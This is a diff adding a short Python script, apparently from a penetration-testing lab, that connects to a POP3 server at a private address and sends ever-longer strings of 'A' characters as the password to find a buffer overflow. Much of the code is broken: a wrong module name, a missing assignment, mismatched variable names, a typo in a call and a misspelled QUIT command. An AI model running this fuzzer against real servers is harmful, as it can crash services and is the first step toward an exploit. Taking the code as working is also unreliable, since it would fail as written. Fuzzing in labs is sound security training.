@@ -1,0 +1,20 @@
+#!/usr/bin/python
+
+import sockets
+
+buffer=["A"]
+counter 100
+while len(buffer) <=30:
+	buffer.append("A"*counter)
+	counter=counter+200
+
+for srings in buffer:
+	print "Fuzzing PASS with %s bytes" % len(string)
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect=s.connect(('10.10.10.16', 110))
+	s.recv(1024_
+	s.send('USER test\r\n')
+	s.recv(1024)
+	s.send('PASS ' + string + '\r\n')
+	s.send('QUID\r\n')
+s.close()
